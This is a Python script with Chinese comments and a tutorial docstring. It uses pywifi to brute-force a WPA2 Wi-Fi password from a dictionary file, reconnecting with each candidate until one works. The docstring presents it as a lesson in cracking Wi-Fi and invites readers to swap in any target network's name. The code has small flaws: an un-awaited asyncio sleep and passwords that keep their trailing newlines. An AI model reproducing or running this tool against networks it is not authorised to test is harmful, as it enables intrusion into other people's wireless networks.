#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

import time  #时间
import pywifi  #破解wifi
from pywifi import const  #引用一些定义
from asyncio.tasks import sleep

'''
下面讲解一下实现过程：

1）首先导入pywifi模块，因为要启用wifi那么必须要有启用wifi的模块。

2）有了启用wifi的模块以后，我们首先要抓取网卡接口， 
因为连接无线wifi，必须要有网卡才行。一台电脑可能有很多网卡， 
但是一般都只有一个wifi网卡，我们使用第一个网卡就行了。

3）抓取到以后就进行连接测试，首选是要断开所有的wifi网卡上 
的已连接成功的，因为有可能wifi上有连接成功的在。

4）断开所有的wifi以后，我们就可以进行破解了， 
从（.txt）文档中一行一行读取我们的密码字典， 
一遍一遍的刷密码，直到返回isOK为True,表示破解成功。

5）因为连接也是要时间的，不可能一秒钟尝试好多次， 
所以我们设置了睡眠sleep.

大家可能还有疑问，那就是test_connect这个方法中的代码，

1） profile.ssid =”e2”表示你要破解的wifi的ssid也就是wifi名称， 
我手机开了热点，热点名字是e2所以我写了e2， 
大家可以自己更该要破解的名称

2） profile.key就是要输入的密码

3） 别的代码差不多就是固定写法了，还有加密算法可以更改， 
这里就不进行具体讲解了，本篇主要让大家简单学会破解。
'''
class PoJie():
    def __init__(self,path):
        self.file=open(path,"r",errors="ignore")
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
        self.iface.disconnect() #测试链接断开所有链接

        time.sleep(1) #休眠1秒

        #测试网卡是否属于断开状态，
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
            print("开始破解：")
            while True:

                try:
                    myStr =self.file.readline()
                    if not myStr:
                        break
                    bool1=self.test_connect(myStr)
                    if bool1:
                        print("密码正确：",myStr)
                        break
                    else:
                        print("密码错误:"+myStr)
                    sleep(3)
                except:
                    continue

    def test_connect(self,findStr):#测试链接

        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid ="e2" #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码

        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(tmp_profile)#链接
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True   
        else:
            isOK=False
        self.iface.disconnect() #断开
        time.sleep(1)
        #检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK


    def __del__(self):
        self.file.close()

path=r"C:\Users\Administrator\Desktop\csdnwifi.txt"
start=PoJie(path)
start.readPassWord()
